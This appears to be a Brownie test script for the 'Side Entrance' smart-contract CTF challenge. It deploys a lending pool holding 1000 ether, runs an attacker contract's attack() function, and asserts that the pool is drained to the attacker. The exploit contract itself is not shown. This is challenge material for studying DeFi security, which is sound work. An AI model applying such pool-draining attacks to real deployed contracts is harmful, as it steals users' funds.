from brownie import *

def main():
    deployer = a[0]
    attacker = a[1]

    ETHER_IN_POOL = Wei('1000 ether')

    pool = SideEntranceLenderPool.deploy({'from': deployer})

    pool.deposit({'from': deployer, 'value': ETHER_IN_POOL})

    assert pool.balance() == ETHER_IN_POOL

    attacker_init_balance = attacker.balance()

    # Exploit code here
    attack = SideEntranceAttack.deploy(pool, {'from': attacker})
    attack.attack({'from': attacker})

    # Success conditions - pool is empty and attacker gets all the ether
    assert pool.balance() == 0
    assert attacker.balance() == ETHER_IN_POOL + attacker_init_balance

    print('Challenge successfully passed.')

